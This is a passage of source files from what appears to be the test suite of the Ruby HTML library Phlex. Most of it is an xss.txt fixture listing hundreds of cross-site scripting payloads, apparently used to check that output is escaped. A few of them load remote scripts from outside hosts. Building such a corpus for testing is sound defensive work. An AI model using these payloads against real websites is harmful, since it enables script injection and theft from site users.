 4 | 	def phlex(component = Phlex::HTML, *a, **k, &)
 5 | 		component.new(*a, **k).call do |e|
 6 | 			e.instance_exec(&)
 7 | 		end
 8 | 	end
 9 | end
10 |


--------------------------------------------------------------------------------
/fixtures/view_helper.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | module ViewHelper
 4 | 	def self.extended(parent)
 5 | 		parent.class_exec do
 6 | 			let(:output) { example.call }
 7 | 			let(:example) { view.new }
 8 | 		end
 9 | 	end
10 |
11 | 	def view(&block)
12 | 		let :view do
13 | 			Class.new(Phlex::HTML, &block)
14 | 		end
15 | 	end
16 |
17 | 	def svg_view(&block)
18 | 		let :view do
19 | 			Class.new(Phlex::SVG, &block)
20 | 		end
21 | 	end
22 | end
23 |


--------------------------------------------------------------------------------
/fixtures/xss.txt:
--------------------------------------------------------------------------------
   1 | "-prompt(8)-"
   2 | '-prompt(8)-'
   3 | ";a=prompt,a()//
   4 | ';a=prompt,a()//
   5 | '-eval("window['pro'%2B'mpt'](8)")-'
   6 | "-eval("window['pro'%2B'mpt'](8)")-"
   7 | "onclick=prompt(8)>"@x.y
   8 | "onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
   9 | <image/src/onerror=prompt(8)>
  10 | <img/src/onerror=prompt(8)>
  11 | <image src/onerror=prompt(8)>
  12 | <img src/onerror=prompt(8)>
  13 | <image src =q onerror=prompt(8)>
  14 | <img src =q onerror=prompt(8)>
  15 | </scrip</script>t><img src =q onerror=prompt(8)>
  16 | <svg onload=alert(1)>
  17 | "><svg onload=alert(1)//
  18 | "onmouseover=alert(1)//
  19 | "autofocus/onfocus=alert(1)//
  20 | '-alert(1)-'
  21 | '-alert(1)//
  22 | \'-alert(1)//
  23 | </script><svg onload=alert(1)>
  24 | <x contenteditable onblur=alert(1)>lose focus!
  25 | <x onclick=alert(1)>click this!
  26 | <x oncopy=alert(1)>copy this!
  27 | <x oncontextmenu=alert(1)>right click this!
  28 | <x oncut=alert(1)>copy this!
  29 | <x ondblclick=alert(1)>double click this!
  30 | <x ondrag=alert(1)>drag this!
  31 | <x contenteditable onfocus=alert(1)>focus this!
  32 | <x contenteditable oninput=alert(1)>input here!
  33 | <x contenteditable onkeydown=alert(1)>press any key!
  34 | <x contenteditable onkeypress=alert(1)>press any key!
  35 | <x contenteditable onkeyup=alert(1)>press any key!
  36 | <x onmousedown=alert(1)>click this!
  37 | <x onmousemove=alert(1)>hover this!
  38 | <x onmouseout=alert(1)>hover this!
  39 | <x onmouseover=alert(1)>hover this!
  40 | <x onmouseup=alert(1)>click this!
  41 | <x contenteditable onpaste=alert(1)>paste here!
  42 | <script>alert(1)//
  43 | <script>alert(1)<!–
  44 | <script src=//brutelogic.com.br/1.js>
  45 | <script src=//3334957647/1>
  46 | %3Cx onxxx=alert(1)
  47 | <%78 onxxx=1
  48 | <x %6Fnxxx=1
  49 | <x o%6Exxx=1
  50 | <x on%78xx=1
  51 | <x onxxx%3D1
  52 | <X onxxx=1
  53 | <x OnXxx=1
  54 | <X OnXxx=1
  55 | <x onxxx=1 onxxx=1
  56 | <x/onxxx=1
  57 | <x%09onxxx=1
  58 | <x%0Aonxxx=1
  59 | <x%0Conxxx=1
  60 | <x%0Donxxx=1
  61 | <x%2Fonxxx=1
  62 | <x 1='1'onxxx=1
  63 | <x 1="1"onxxx=1
  64 | <x </onxxx=1
  65 | <x 1=">" onxxx=1
  66 | <http://onxxx%3D1/
  67 | <x onxxx=alert(1) 1='
  68 | <svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>
  69 | 'onload=alert(1)><svg/1='
  70 | '>alert(1)</script><script/1='
  71 | */alert(1)</script><script>/*
  72 | */alert(1)">'onload="/*<svg/1='
  73 | `-alert(1)">'onload="`<svg/1='
  74 | */</script>'>alert(1)/*<script/1='
  75 | <script>alert(1)</script>
  76 | <script src=javascript:alert(1)>
  77 | <iframe src=javascript:alert(1)>
  78 | <embed src=javascript:alert(1)>
  79 | <a href=javascript:alert(1)>click
  80 | <math><brute href=javascript:alert(1)>click
  81 | <form action=javascript:alert(1)><input type=submit>
  82 | <isindex action=javascript:alert(1) type=submit value=click>
  83 | <form><button formaction=javascript:alert(1)>click
  84 | <form><input formaction=javascript:alert(1) type=submit value=click>
  85 | <form><input formaction=javascript:alert(1) type=image value=click>
  86 | <form><input formaction=javascript:alert(1) type=image src=SOURCE>
  87 | <isindex formaction=javascript:alert(1) type=submit value=click>
  88 | <object data=javascript:alert(1)>
  89 | <iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
  90 | <svg><script xlink:href=data:,alert(1) />
  91 | <math><brute xlink:href=javascript:alert(1)>click
  92 | <svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>
  93 | <html ontouchstart=alert(1)>
  94 | <html ontouchend=alert(1)>
  95 | <html ontouchmove=alert(1)>
  96 | <html ontouchcancel=alert(1)>
  97 | <body onorientationchange=alert(1)>
  98 | "><img src=1 onerror=alert(1)>.gif
  99 | <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
 100 | GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
 101 | <script src="data:&comma;alert(1)//
 102 | "><script src=data:&comma;alert(1)//
 103 | <script src="//brutelogic.com.br&sol;1.js&num;
 104 | "><script src=//brutelogic.com.br&sol;1.js&num;
 105 | <link rel=import href="data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
 106 | "><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
 107 | <base href=//0>
 108 | <script/src="data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)
 109 | <body onload=alert(1)>
 110 | <body onpageshow=alert(1)>
 111 | <body onfocus=alert(1)>
 112 | <body onhashchange=alert(1)><a href=#x>click this!#x
 113 | <body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x
 114 | <body onscroll=alert(1)><br><br><br><br>
 115 | <br><br><br><br><br><br><br><br><br><br>
 116 | <br><br><br><br><br><br><br><br><br><br>
 117 | <br><br><br><br><br><br><x id=x>#x
 118 | <body onresize=alert(1)>press F12!
 119 | <body onhelp=alert(1)>press F1! (MSIE)
 120 | <marquee onstart=alert(1)>
 121 | <marquee loop=1 width=0 onfinish=alert(1)>
 122 | <audio src onloadstart=alert(1)>
 123 | <video onloadstart=alert(1)><source>
 124 | <input autofocus onblur=alert(1)>
 125 | <keygen autofocus onfocus=alert(1)>
 126 | <form onsubmit=alert(1)><input type=submit>
 127 | <select onchange=alert(1)><option>1<option>2
 128 | <menu id=x contextmenu=x onshow=alert(1)>right click me!
 129 | alert`1`
 130 | alert&lpar;1&rpar;
 131 | alert&#x28;1&#x29
 132 | alert&#40;1&#41
 133 | (alert)(1)
 134 | a=alert,a(1)
 135 | [1].find(alert)
 136 | top["al"+"ert"](1)
 137 | top[/al/.source+/ert/.source](1)
 138 | al\u0065rt(1)
 139 | top['al\145rt'](1)
 140 | top['al\x65rt'](1)
 141 | top[8680439..toString(30)](1)
 142 | navigator.vibrate(500)
 143 | eval(URL.slice(-8))>#alert(1)
 144 | eval(location.hash.slice(1)>#alert(1)
 145 | innerHTML=location.hash>#<script>alert(1)</script>
 146 | <a draggable="true" ondrag="alert(1)">test</a>
 147 | <a draggable="true" ondragend="alert(1)">test</a>
 148 | <a draggable="true" ondragenter="alert(1)">test</a>
 149 | <a draggable="true" ondragleave="alert(1)">test</a>
 150 | <a draggable="true" ondragstart="alert(1)">test</a>
 151 | <a id=x tabindex=1 onactivate=alert(1)></a>
 152 | <a id=x tabindex=1 onbeforeactivate=alert(1)></a>
 153 | <a id=x tabindex=1 onbeforedeactivate=alert(1)></a><input autofocus>
 154 | <a id=x tabindex=1 ondeactivate=alert(1)></a><input id=y autofocus>
 155 | <a id=x tabindex=1 onfocus=alert(1)></a>
 156 | <a id=x tabindex=1 onfocusin=alert(1)></a>
 157 | <a onbeforecopy="alert(1)" contenteditable>test</a>
 158 | <a onbeforecut="alert(1)" contenteditable>test</a>
 159 | <a onbeforepaste="alert(1)" contenteditable>test</a>
 160 | <a onblur=alert(1) tabindex=1 id=x></a><input autofocus>
 161 | <a onclick="alert(1)">test</a>
 162 | <a oncontextmenu="alert(1)">test</a>
 163 | <a oncopy="alert(1)" contenteditable>test</a>
 164 | <a oncut="alert(1)" contenteditable>test</a>
 165 | <a ondblclick="alert(1)">test</a>
 166 | <a onfocusout=alert(1) tabindex=1 id=x></a><input autofocus>
 167 | <a onkeydown="alert(1)" contenteditable>test</a>
 168 | <a onkeypress="alert(1)" contenteditable>test</a>
 169 | <a onkeyup="alert(1)" contenteditable>test</a>
 170 | <a onmousedown="alert(1)">test</a>
 171 | <a onmouseenter="alert(1)">test</a>
 172 | <a onmouseleave="alert(1)">test</a>
 173 | <a onmousemove="alert(1)">test</a>
 174 | <a onmouseout="alert(1)">test</a>
 175 | <a onmouseover="alert(1)">test</a>
 176 | <a onmouseup="alert(1)">test</a>
 177 | <a onpaste="alert(1)" contenteditable>test</a>
 178 | <abbr draggable="true" ondrag="alert(1)">test</abbr>
 179 | <abbr draggable="true" ondragend="alert(1)">test</abbr>
 180 | <abbr draggable="true" ondragenter="alert(1)">test</abbr>
 181 | <abbr draggable="true" ondragleave="alert(1)">test</abbr>
 182 | <abbr draggable="true" ondragstart="alert(1)">test</abbr>
 183 | <abbr id=x tabindex=1 onactivate=alert(1)></abbr>
 184 | <abbr id=x tabindex=1 onbeforeactivate=alert(1)></abbr>
 185 | <abbr id=x tabindex=1 onbeforedeactivate=alert(1)></abbr><input autofocus>
 186 | <abbr id=x tabindex=1 ondeactivate=alert(1)></abbr><input id=y autofocus>
 187 | <abbr id=x tabindex=1 onfocus=alert(1)></abbr>
 188 | <abbr id=x tabindex=1 onfocusin=alert(1)></abbr>
 189 | <abbr onbeforecopy="alert(1)" contenteditable>test</abbr>
 190 | <abbr onbeforecut="alert(1)" contenteditable>test</abbr>
 191 | <abbr onbeforepaste="alert(1)" contenteditable>test</abbr>
 192 | <abbr onblur=alert(1) tabindex=1 id=x></abbr><input autofocus>
 193 | <abbr onclick="alert(1)">test</abbr>
 194 | <abbr oncontextmenu="alert(1)">test</abbr>
 195 | <abbr oncopy="alert(1)" contenteditable>test</abbr>
 196 | <abbr oncut="alert(1)" contenteditable>test</abbr>
 197 | <abbr ondblclick="alert(1)">test</abbr>
 198 | <abbr onfocusout=alert(1) tabindex=1 id=x></abbr><input autofocus>
 199 | <abbr onkeydown="alert(1)" contenteditable>test</abbr>
 200 | <abbr onkeypress="alert(1)" contenteditable>test</abbr>
 201 | <abbr onkeyup="alert(1)" contenteditable>test</abbr>
 202 | <abbr onmousedown="alert(1)">test</abbr>
 203 | <abbr onmouseenter="alert(1)">test</abbr>
 204 | <abbr onmouseleave="alert(1)">test</abbr>
 205 | <abbr onmousemove="alert(1)">test</abbr>
 206 | <abbr onmouseout="alert(1)">test</abbr>
 207 | <abbr onmouseover="alert(1)">test</abbr>
 208 | <abbr onmouseup="alert(1)">test</abbr>
 209 | <abbr onpaste="alert(1)" contenteditable>test</abbr>
 210 | <acronym draggable="true" ondrag="alert(1)">test</acronym>
 211 | <acronym draggable="true" ondragend="alert(1)">test</acronym>
 212 | <acronym draggable="true" ondragenter="alert(1)">test</acronym>
 213 | <acronym draggable="true" ondragleave="alert(1)">test</acronym>
 214 | <acronym draggable="true" ondragstart="alert(1)">test</acronym>
 215 | <acronym id=x tabindex=1 onactivate=alert(1)></acronym>
 216 | <acronym id=x tabindex=1 onbeforeactivate=alert(1)></acronym>
 217 | <acronym id=x tabindex=1 onbeforedeactivate=alert(1)></acronym><input autofocus>
 218 | <acronym id=x tabindex=1 ondeactivate=alert(1)></acronym><input id=y autofocus>
 219 | <acronym id=x tabindex=1 onfocus=alert(1)></acronym>
 220 | <acronym id=x tabindex=1 onfocusin=alert(1)></acronym>
 221 | <acronym onbeforecopy="alert(1)" contenteditable>test</acronym>
 222 | <acronym onbeforecut="alert(1)" contenteditable>test</acronym>
 223 | <acronym onbeforepaste="alert(1)" contenteditable>test</acronym>
 224 | <acronym onblur=alert(1) tabindex=1 id=x></acronym><input autofocus>
 225 | <acronym onclick="alert(1)">test</acronym>
 226 | <acronym oncontextmenu="alert(1)">test</acronym>
 227 | <acronym oncopy="alert(1)" contenteditable>test</acronym>
 228 | <acronym oncut="alert(1)" contenteditable>test</acronym>
 229 | <acronym ondblclick="alert(1)">test</acronym>
 230 | <acronym onfocusout=alert(1) tabindex=1 id=x></acronym><input autofocus>
 231 | <acronym onkeydown="alert(1)" contenteditable>test</acronym>
 232 | <acronym onkeypress="alert(1)" contenteditable>test</acronym>
 233 | <acronym onkeyup="alert(1)" contenteditable>test</acronym>
 234 | <acronym onmousedown="alert(1)">test</acronym>
 235 | <acronym onmouseenter="alert(1)">test</acronym>
 236 | <acronym onmouseleave="alert(1)">test</acronym>
 237 | <acronym onmousemove="alert(1)">test</acronym>
 238 | <acronym onmouseout="alert(1)">test</acronym>
 239 | <acronym onmouseover="alert(1)">test</acronym>
 240 | <acronym onmouseup="alert(1)">test</acronym>
 241 | <acronym onpaste="alert(1)" contenteditable>test</acronym>
 242 | <address draggable="true" ondrag="alert(1)">test</address>
 243 | <address draggable="true" ondragend="alert(1)">test</address>
 244 | <address draggable="true" ondragenter="alert(1)">test</address>
 245 | <address draggable="true" ondragleave="alert(1)">test</address>
 246 | <address draggable="true" ondragstart="alert(1)">test</address>
 247 | <address id=x tabindex=1 onactivate=alert(1)></address>
 248 | <address id=x tabindex=1 onbeforeactivate=alert(1)></address>
 249 | <address id=x tabindex=1 onbeforedeactivate=alert(1)></address><input autofocus>
 250 | <address id=x tabindex=1 ondeactivate=alert(1)></address><input id=y autofocus>
 251 | <address id=x tabindex=1 onfocus=alert(1)></address>
 252 | <address id=x tabindex=1 onfocusin=alert(1)></address>
 253 | <address onbeforecopy="alert(1)" contenteditable>test</address>
 254 | <address onbeforecut="alert(1)" contenteditable>test</address>
 255 | <address onbeforepaste="alert(1)" contenteditable>test</address>
 256 | <address onblur=alert(1) tabindex=1 id=x></address><input autofocus>
 257 | <address onclick="alert(1)">test</address>
 258 | <address oncontextmenu="alert(1)">test</address>
 259 | <address oncopy="alert(1)" contenteditable>test</address>
 260 | <address oncut="alert(1)" contenteditable>test</address>
 261 | <address ondblclick="alert(1)">test</address>
 262 | <address onfocusout=alert(1) tabindex=1 id=x></address><input autofocus>
 263 | <address onkeydown="alert(1)" contenteditable>test</address>
 264 | <address onkeypress="alert(1)" contenteditable>test</address>
 265 | <address onkeyup="alert(1)" contenteditable>test</address>
 266 | <address onmousedown="alert(1)">test</address>
 267 | <address onmouseenter="alert(1)">test</address>
 268 | <address onmouseleave="alert(1)">test</address>
 269 | <address onmousemove="alert(1)">test</address>
 270 | <address onmouseout="alert(1)">test</address>
 271 | <address onmouseover="alert(1)">test</address>
 272 | <address onmouseup="alert(1)">test</address>
 273 | <address onpaste="alert(1)" contenteditable>test</address>
 274 | <applet draggable="true" ondrag="alert(1)">test</applet>
 275 | <applet draggable="true" ondragend="alert(1)">test</applet>
 276 | <applet draggable="true" ondragenter="alert(1)">test</applet>
 277 | <applet draggable="true" ondragleave="alert(1)">test</applet>
 278 | <applet draggable="true" ondragstart="alert(1)">test</applet>
 279 | <applet id=x tabindex=1 onactivate=alert(1)></applet>
 280 | <applet id=x tabindex=1 onbeforeactivate=alert(1)></applet>
 281 | <applet id=x tabindex=1 onbeforedeactivate=alert(1)></applet><input autofocus>
 282 | <applet id=x tabindex=1 ondeactivate=alert(1)></applet><input id=y autofocus>
 283 | <applet id=x tabindex=1 onfocus=alert(1)></applet>
 284 | <applet id=x tabindex=1 onfocusin=alert(1)></applet>
 285 | <applet onbeforecopy="alert(1)" contenteditable>test</applet>
 286 | <applet onbeforecut="alert(1)" contenteditable>test</applet>
 287 | <applet onbeforepaste="alert(1)" contenteditable>test</applet>
 288 | <applet onblur=alert(1) tabindex=1 id=x></applet><input autofocus>
 289 | <applet onclick="alert(1)">test</applet>
 290 | <applet oncontextmenu="alert(1)">test</applet>
 291 | <applet oncopy="alert(1)" contenteditable>test</applet>
 292 | <applet oncut="alert(1)" contenteditable>test</applet>
 293 | <applet ondblclick="alert(1)">test</applet>
 294 | <applet onfocusout=alert(1) tabindex=1 id=x></applet><input autofocus>
 295 | <applet onkeydown="alert(1)" contenteditable>test</applet>
 296 | <applet onkeypress="alert(1)" contenteditable>test</applet>
 297 | <applet onkeyup="alert(1)" contenteditable>test</applet>
 298 | <applet onmousedown="alert(1)">test</applet>
 299 | <applet onmouseenter="alert(1)">test</applet>
 300 | <applet onmouseleave="alert(1)">test</applet>
 301 | <applet onmousemove="alert(1)">test</applet>
 302 | <applet onmouseout="alert(1)">test</applet>
 303 | <applet onmouseover="alert(1)">test</applet>
 304 | <applet onmouseup="alert(1)">test</applet>
 305 | <applet onpaste="alert(1)" contenteditable>test</applet>
 306 | <applet onreadystatechange=alert(1)></applet>
 307 | <area draggable="true" ondrag="alert(1)">test</area>
 308 | <area draggable="true" ondragend="alert(1)">test</area>
 309 | <area draggable="true" ondragenter="alert(1)">test</area>
 310 | <area draggable="true" ondragleave="alert(1)">test</area>
 311 | <area draggable="true" ondragstart="alert(1)">test</area>
 312 | <area id=x tabindex=1 onactivate=alert(1)></area>
 313 | <area id=x tabindex=1 onbeforeactivate=alert(1)></area>
 314 | <area id=x tabindex=1 onbeforedeactivate=alert(1)></area><input autofocus>
 315 | <area id=x tabindex=1 ondeactivate=alert(1)></area><input id=y autofocus>
 316 | <area onbeforecopy="alert(1)" contenteditable>test</area>
 317 | <area onbeforecut="alert(1)" contenteditable>test</area>
 318 | <area onbeforepaste="alert(1)" contenteditable>test</area>
 319 | <area onblur=alert(1) tabindex=1 id=x></area><input autofocus>
 320 | <area onclick="alert(1)">test</area>
 321 | <area oncontextmenu="alert(1)">test</area>
 322 | <area oncopy="alert(1)" contenteditable>test</area>
 323 | <area oncut="alert(1)" contenteditable>test</area>
 324 | <area ondblclick="alert(1)">test</area>
 325 | <area onfocusout=alert(1) tabindex=1 id=x></area><input autofocus>
 326 | <area onkeydown="alert(1)" contenteditable>test</area>
 327 | <area onkeypress="alert(1)" contenteditable>test</area>
 328 | <area onkeyup="alert(1)" contenteditable>test</area>
 329 | <area onmousedown="alert(1)">test</area>
 330 | <area onmouseenter="alert(1)">test</area>
 331 | <area onmouseleave="alert(1)">test</area>
 332 | <area onmousemove="alert(1)">test</area>
 333 | <area onmouseout="alert(1)">test</area>
 334 | <area onmouseover="alert(1)">test</area>
 335 | <area onmouseup="alert(1)">test</area>
 336 | <area onpaste="alert(1)" contenteditable>test</area>
 337 | <article draggable="true" ondrag="alert(1)">test</article>
 338 | <article draggable="true" ondragend="alert(1)">test</article>
 339 | <article draggable="true" ondragenter="alert(1)">test</article>
 340 | <article draggable="true" ondragleave="alert(1)">test</article>
 341 | <article draggable="true" ondragstart="alert(1)">test</article>
 342 | <article id=x tabindex=1 onactivate=alert(1)></article>
 343 | <article id=x tabindex=1 onbeforeactivate=alert(1)></article>
 344 | <article id=x tabindex=1 onbeforedeactivate=alert(1)></article><input autofocus>
 345 | <article id=x tabindex=1 ondeactivate=alert(1)></article><input id=y autofocus>
 346 | <article id=x tabindex=1 onfocus=alert(1)></article>
 347 | <article id=x tabindex=1 onfocusin=alert(1)></article>
 348 | <article onbeforecopy="alert(1)" contenteditable>test</article>
 349 | <article onbeforecut="alert(1)" contenteditable>test</article>
 350 | <article onbeforepaste="alert(1)" contenteditable>test</article>
 351 | <article onblur=alert(1) tabindex=1 id=x></article><input autofocus>
 352 | <article onclick="alert(1)">test</article>
 353 | <article oncontextmenu="alert(1)">test</article>
 354 | <article oncopy="alert(1)" contenteditable>test</article>
 355 | <article oncut="alert(1)" contenteditable>test</article>
 356 | <article ondblclick="alert(1)">test</article>
 357 | <article onfocusout=alert(1) tabindex=1 id=x></article><input autofocus>
 358 | <article onkeydown="alert(1)" contenteditable>test</article>
 359 | <article onkeypress="alert(1)" contenteditable>test</article>
 360 | <article onkeyup="alert(1)" contenteditable>test</article>
 361 | <article onmousedown="alert(1)">test</article>
 362 | <article onmouseenter="alert(1)">test</article>
 363 | <article onmouseleave="alert(1)">test</article>
 364 | <article onmousemove="alert(1)">test</article>
 365 | <article onmouseout="alert(1)">test</article>
 366 | <article onmouseover="alert(1)">test</article>
 367 | <article onmouseup="alert(1)">test</article>
 368 | <article onpaste="alert(1)" contenteditable>test</article>
 369 | <aside draggable="true" ondrag="alert(1)">test</aside>
 370 | <aside draggable="true" ondragend="alert(1)">test</aside>
 371 | <aside draggable="true" ondragenter="alert(1)">test</aside>
 372 | <aside draggable="true" ondragleave="alert(1)">test</aside>
 373 | <aside draggable="true" ondragstart="alert(1)">test</aside>
 374 | <aside id=x tabindex=1 onactivate=alert(1)></aside>
 375 | <aside id=x tabindex=1 onbeforeactivate=alert(1)></aside>
 376 | <aside id=x tabindex=1 onbeforedeactivate=alert(1)></aside><input autofocus>
 377 | <aside id=x tabindex=1 ondeactivate=alert(1)></aside><input id=y autofocus>
 378 | <aside id=x tabindex=1 onfocus=alert(1)></aside>
 379 | <aside id=x tabindex=1 onfocusin=alert(1)></aside>
 380 | <aside onbeforecopy="alert(1)" contenteditable>test</aside>
 381 | <aside onbeforecut="alert(1)" contenteditable>test</aside>
 382 | <aside onbeforepaste="alert(1)" contenteditable>test</aside>
 383 | <aside onblur=alert(1) tabindex=1 id=x></aside><input autofocus>
 384 | <aside onclick="alert(1)">test</aside>
 385 | <aside oncontextmenu="alert(1)">test</aside>
 386 | <aside oncopy="alert(1)" contenteditable>test</aside>
 387 | <aside oncut="alert(1)" contenteditable>test</aside>
 388 | <aside ondblclick="alert(1)">test</aside>
 389 | <aside onfocusout=alert(1) tabindex=1 id=x></aside><input autofocus>
 390 | <aside onkeydown="alert(1)" contenteditable>test</aside>
 391 | <aside onkeypress="alert(1)" contenteditable>test</aside>
 392 | <aside onkeyup="alert(1)" contenteditable>test</aside>
 393 | <aside onmousedown="alert(1)">test</aside>
 394 | <aside onmouseenter="alert(1)">test</aside>
 395 | <aside onmouseleave="alert(1)">test</aside>
 396 | <aside onmousemove="alert(1)">test</aside>
 397 | <aside onmouseout="alert(1)">test</aside>
 398 | <aside onmouseover="alert(1)">test</aside>
 399 | <aside onmouseup="alert(1)">test</aside>
 400 | <aside onpaste="alert(1)" contenteditable>test</aside>
 401 | <audio autoplay controls onpause=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
 402 | <audio autoplay controls onseeked=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
 403 | <audio autoplay controls onseeking=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
 404 | <audio autoplay controls onvolumechange=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
 405 | <audio autoplay onloadedmetadata=alert(1)> <source src="validaudio.wav" type="audio/wav"></audio>
 406 | <audio autoplay onplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
 407 | <audio autoplay onplaying=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
 408 | <audio controls autoplay onended=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
 409 | <audio controls autoplay ontimeupdate=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
 410 | <audio draggable="true" ondrag="alert(1)">test</audio>
 411 | <audio draggable="true" ondragend="alert(1)">test</audio>
 412 | <audio draggable="true" ondragenter="alert(1)">test</audio>
 413 | <audio draggable="true" ondragleave="alert(1)">test</audio>
 414 | <audio draggable="true" ondragstart="alert(1)">test</audio>
 415 | <audio id=x controls onfocus=alert(1) id=x><source src="validaudio.wav"></audio>
 416 | <audio id=x controls onfocusin=alert(1) id=x><source src="validaudio.wav"></audio>
 417 | <audio id=x tabindex=1 onactivate=alert(1)></audio>
 418 | <audio id=x tabindex=1 onbeforeactivate=alert(1)></audio>
 419 | <audio id=x tabindex=1 onbeforedeactivate=alert(1)></audio><input autofocus>
 420 | <audio id=x tabindex=1 ondeactivate=alert(1)></audio><input id=y autofocus>
 421 | <audio onbeforecopy="alert(1)" contenteditable>test</audio>
 422 | <audio onbeforecut="alert(1)" contenteditable>test</audio>
 423 | <audio onbeforepaste="alert(1)" contenteditable>test</audio>
 424 | <audio onblur=alert(1) tabindex=1 id=x></audio><input autofocus>
 425 | <audio oncanplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
 426 | <audio onclick="alert(1)">test</audio>
 427 | <audio oncontextmenu="alert(1)">test</audio>
 428 | <audio oncopy="alert(1)" contenteditable>test</audio>
 429 | <audio oncut="alert(1)" contenteditable>test</audio>
 430 | <audio ondblclick="alert(1)">test</audio>
 431 | <audio onfocusout=alert(1) tabindex=1 id=x></audio><input autofocus>
 432 | <audio onkeydown="alert(1)" contenteditable>test</audio>
 433 | <audio onkeypress="alert(1)" contenteditable>test</audio>
 434 | <audio onkeyup="alert(1)" contenteditable>test</audio>
 435 | <audio onloadeddata=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
 436 | <audio onmousedown="alert(1)">test</audio>
 437 | <audio onmouseenter="alert(1)">test</audio>
 438 | <audio onmouseleave="alert(1)">test</audio>
 439 | <audio onmousemove="alert(1)">test</audio>
 440 | <audio onmouseout="alert(1)">test</audio>
 441 | <audio onmouseover="alert(1)">test</audio>
 442 | <audio onmouseup="alert(1)">test</audio>
 443 | <audio onpaste="alert(1)" contenteditable>test</audio>
 444 | <audio src/onerror=alert(1)>
 445 | <b draggable="true" ondrag="alert(1)">test</b>
 446 | <b draggable="true" ondragend="alert(1)">test</b>
 447 | <b draggable="true" ondragenter="alert(1)">test</b>
 448 | <b draggable="true" ondragleave="alert(1)">test</b>
 449 | <b draggable="true" ondragstart="alert(1)">test</b>
 450 | <b id=x tabindex=1 onactivate=alert(1)></b>
 451 | <b id=x tabindex=1 onbeforeactivate=alert(1)></b>
 452 | <b id=x tabindex=1 onbeforedeactivate=alert(1)></b><input autofocus>
 453 | <b id=x tabindex=1 ondeactivate=alert(1)></b><input id=y autofocus>
 454 | <b id=x tabindex=1 onfocus=alert(1)></b>
 455 | <b id=x tabindex=1 onfocusin=alert(1)></b>
 456 | <b onbeforecopy="alert(1)" contenteditable>test</b>
 457 | <b onbeforecut="alert(1)" contenteditable>test</b>
 458 | <b onbeforepaste="alert(1)" contenteditable>test</b>
 459 | <b onblur=alert(1) tabindex=1 id=x></b><input autofocus>
 460 | <b onclick="alert(1)">test</b>
 461 | <b oncontextmenu="alert(1)">test</b>
 462 | <b oncopy="alert(1)" contenteditable>test</b>
 463 | <b oncut="alert(1)" contenteditable>test</b>
 464 | <b ondblclick="alert(1)">test</b>
 465 | <b onfocusout=alert(1) tabindex=1 id=x></b><input autofocus>
 466 | <b onkeydown="alert(1)" contenteditable>test</b>
 467 | <b onkeypress="alert(1)" contenteditable>test</b>
 468 | <b onkeyup="alert(1)" contenteditable>test</b>
 469 | <b onmousedown="alert(1)">test</b>
 470 | <b onmouseenter="alert(1)">test</b>
 471 | <b onmouseleave="alert(1)">test</b>
 472 | <b onmousemove="alert(1)">test</b>
 473 | <b onmouseout="alert(1)">test</b>
 474 | <b onmouseover="alert(1)">test</b>
 475 | <b onmouseup="alert(1)">test</b>
 476 | <b onpaste="alert(1)" contenteditable>test</b>
 477 | <base draggable="true" ondrag="alert(1)">test</base>
 478 | <base draggable="true" ondragend="alert(1)">test</base>
 479 | <base draggable="true" ondragenter="alert(1)">test</base>
 480 | <base draggable="true" ondragleave="alert(1)">test</base>
 481 | <base draggable="true" ondragstart="alert(1)">test</base>
 482 | <base id=x tabindex=1 onactivate=alert(1)></base>
 483 | <base id=x tabindex=1 onbeforeactivate=alert(1)></base>
 484 | <base id=x tabindex=1 onbeforedeactivate=alert(1)></base><input autofocus>
 485 | <base id=x tabindex=1 ondeactivate=alert(1)></base><input id=y autofocus>
 486 | <base id=x tabindex=1 onfocus=alert(1)></base>
 487 | <base id=x tabindex=1 onfocusin=alert(1)></base>
 488 | <base onbeforecopy="alert(1)" contenteditable>test</base>
 489 | <base onbeforecut="alert(1)" contenteditable>test</base>
 490 | <base onbeforepaste="alert(1)" contenteditable>test</base>
 491 | <base onblur=alert(1) tabindex=1 id=x></base><input autofocus>
 492 | <base onclick="alert(1)">test</base>
 493 | <base oncontextmenu="alert(1)">test</base>
 494 | <base oncopy="alert(1)" contenteditable>test</base>
 495 | <base oncut="alert(1)" contenteditable>test</base>
 496 | <base ondblclick="alert(1)">test</base>
 497 | <base onfocusout=alert(1) tabindex=1 id=x></base><input autofocus>
 498 | <base onkeydown="alert(1)" contenteditable>test</base>
 499 | <base onkeypress="alert(1)" contenteditable>test</base>
 500 | <base onkeyup="alert(1)" contenteditable>test</base>
 501 | <base onmousedown="alert(1)">test</base>
 502 | <base onmouseenter="alert(1)">test</base>
 503 | <base onmouseleave="alert(1)">test</base>
 504 | <base onmousemove="alert(1)">test</base>
 505 | <base onmouseout="alert(1)">test</base>
 506 | <base onmouseover="alert(1)">test</base>
 507 | <base onmouseup="alert(1)">test</base>
 508 | <base onpaste="alert(1)" contenteditable>test</base>
 509 | <basefont draggable="true" ondrag="alert(1)">test</basefont>
 510 | <basefont draggable="true" ondragend="alert(1)">test</basefont>
 511 | <basefont draggable="true" ondragenter="alert(1)">test</basefont>
 512 | <basefont draggable="true" ondragleave="alert(1)">test</basefont>
 513 | <basefont draggable="true" ondragstart="alert(1)">test</basefont>
 514 | <basefont id=x tabindex=1 onactivate=alert(1)></basefont>
 515 | <basefont id=x tabindex=1 onbeforeactivate=alert(1)></basefont>
